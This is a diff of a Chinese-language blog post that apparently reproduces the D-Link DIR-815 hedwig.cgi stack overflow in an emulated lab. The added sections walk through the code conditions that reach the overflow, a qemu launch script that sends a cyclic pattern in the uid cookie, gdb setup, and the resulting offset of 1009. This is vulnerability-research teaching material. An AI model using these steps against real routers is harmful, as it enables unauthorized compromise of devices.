@@ -31,8 +31,12 @@
 <meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/610690111.png">
 <meta property="og:image" content="http://yyyffff.github.io/1760610760743.png">
 <meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/633730248.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/064266205.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/064327548.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/064376298.png">
+<meta property="og:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/152741779.png">
 <meta property="article:published_time" content="2025-10-09T09:47:30.000Z">
-<meta property="article:modified_time" content="2025-10-20T16:36:14.517Z">
+<meta property="article:modified_time" content="2025-10-22T17:06:43.842Z">
 <meta property="article:author" content="yyyffff">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://yyyffff.github.io/2025/05/19/IO_FILE%20Exploit/458022594.png">
@@ -241,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k 字
+          2.8k 字
         
       </span>
     
@@ -252,7 +256,7 @@
         
         
         
-          19 分钟
+          24 分钟
         
       </span>
     
@@ -444,6 +448,45 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">v20 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)sobj_get_string(v4);<br><span class="hljs-built_in">sprintf</span>(v27, <span class="hljs-string">&quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;</span>, <span class="hljs-string">&quot;/runtime/session&quot;</span>, v20);<br></code></pre></td></tr></table></figure>
 
 <p>这里也有一个对 v27 写入的，但是由于写入的 v20 是 v4，也就是 uid&#x3D; 之后，而 v4 未改变，所以同样是 uid&#x3D; 后面的内容可以被我们当作 payload 利用</p>
+<p>而走到这需要一些条件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">v7 = fopen(<span class="hljs-string">&quot;/var/tmp/temp.xml&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-keyword">if</span> ( !v7 )<br>&#123;<br>  v1 = <span class="hljs-string">&quot;unable to open temp file.&quot;</span>;<br>  <span class="hljs-keyword">goto</span> LABEL_34;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要能够成功打开 &#x2F;var&#x2F;tmp&#x2F;temp.xml</p>
+<p>这个在模拟环境下创建 &#x2F;var&#x2F;tmp 即可</p>
+<p>第二个则是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !haystack )<br>&#123;<br>  v1 = <span class="hljs-string">&quot;no xml data.&quot;</span>;<br>  <span class="hljs-keyword">goto</span> LABEL_34;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>需要 !haystack 不为 0</p>
+<p>该值在</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cgibin_parse_request(sub_409A6C, <span class="hljs-number">0</span>, <span class="hljs-number">0x20000</span>);<br></code></pre></td></tr></table></figure>
+
+<p>中有出现，进入查看</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/064266205.png" srcset="/img/loading.gif" lazyload></p>
+<p>当 REQUEST_URI 有东西时，就不会使 v9&#x3D;0，也就会执行到</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/064327548.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里会进行一系列函数调用，会调用到</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/064376298.png" srcset="/img/loading.gif" lazyload></p>
+<p>改变 haystack 值从而可以溢出</p>
+<p>这里就要求环境变量 REQUEST_URI 中有内容，将其设置为 application&#x2F;x-www-form-urlencoded</p>
+<h1 id="用户态调试"><a href="#用户态调试" class="headerlink" title="用户态调试"></a>用户态调试</h1><h2 id="测量偏移"><a href="#测量偏移" class="headerlink" title="测量偏移"></a>测量偏移</h2><p>执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cyclic 2000 &gt; payload<br></code></pre></td></tr></table></figure>
+
+<p>创建 start.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># start.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br> <br><span class="hljs-comment"># 定义输入数据和相关变量</span><br>INPUT=<span class="hljs-string">&quot;XiDP=Pwner&quot;</span>                          <span class="hljs-comment"># 发送的数据内容，也就是POST请求发送的正文</span><br>LEN=$(<span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$INPUT</span>&quot;</span> | <span class="hljs-built_in">wc</span> -c)                 <span class="hljs-comment"># 计算内容长度</span><br>COOKIE=<span class="hljs-string">&quot;uid=`cat payload`&quot;</span>   <span class="hljs-comment"># 将文件payload的内容提取出来，插入到uid=.....之中</span><br> <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$INPUT</span> | qemu-mipsel -L ./ -0 <span class="hljs-string">&quot;hedwig.cgi&quot;</span> \ <span class="hljs-comment"># 把INPUT内容写到管道，另一端是qumu-mipsel运行的程序 -L ./指定qemu-use使用 root filesystem 或者说动态连接器与库目录搜索，常用于把固件的库放在同目录供程序动态加载 -0 &quot;hedwig.cgi&quot; 强制将argv[0]设为hedwig.cgi</span><br>  -E REQUEST_METHOD=<span class="hljs-string">&quot;POST&quot;</span> \<br>  -E CONTENT_LENGTH=<span class="hljs-variable">$LEN</span> \<br>  -E CONTENT_TYPE=<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span> \<br>  -E HTTP_COOKIE=<span class="hljs-variable">$COOKIE</span> \<br>  -E REQUEST_URI=<span class="hljs-string">&quot;2333&quot;</span> \ <span class="hljs-comment"># -E：qemu-user的选项，用于将指定环境变量传入被执行的程序</span><br>  -g 1234 ./htdocs/cgibin<br><span class="hljs-comment">#-0 参数用于强制设置程序的 argv[0] 值， 后面的 -E 是设置环境变量了 -g 指定端口 echo 可以实现post的功能</span><br><br></code></pre></td></tr></table></figure>
+
+<p>并且创建 mygdb.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># mygdb.sh</span><br><span class="hljs-built_in">set</span> architecture mips      <span class="hljs-comment"># 指定架构                               </span><br><span class="hljs-built_in">set</span> follow-fork-mode child  <span class="hljs-comment"># 指定跟踪子进程</span><br><span class="hljs-built_in">set</span> detach-on-fork off        <span class="hljs-comment"># 当gdb跟踪fork分支时，这条设置不自动分离未被跟踪的乙一方                            </span><br>target remote 127.0.0.1:1234      <br></code></pre></td></tr></table></figure>
+
+<p>然后执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x start.sh<br>./start.sh<br><span class="hljs-comment"># 开启另一个终端执行</span><br>gdb-multiarch -x mygdb.sh<br></code></pre></td></tr></table></figure>
+
+<p>最终 gdb-mutiarch 应该如下</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/152741779.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终确定偏移1009</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yy@yy-virtual-machine:~/桌面/dir815_FW_101/_DIR-815_FW_1.01b14_1.01b14.bin.extraed/squashfs-root$ cyclic -l 0x646b6161<br>1009<br></code></pre></td></tr></table></figure>
+
+<h1 id="学习文章"><a href="#学习文章" class="headerlink" title="学习文章"></a>学习文章</h1><p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18079">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区</a> </p>
+<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15836">IOT安全的入门经典——DIR-815漏洞复现-先知社区</a> </p>
 
                 
               </div>
@@ -505,6 +548,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2025/10/30/2025%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn%E5%A4%8D%E7%8E%B0/" title="2025强网杯线上赛部分pwn复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025强网杯线上赛部分pwn复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
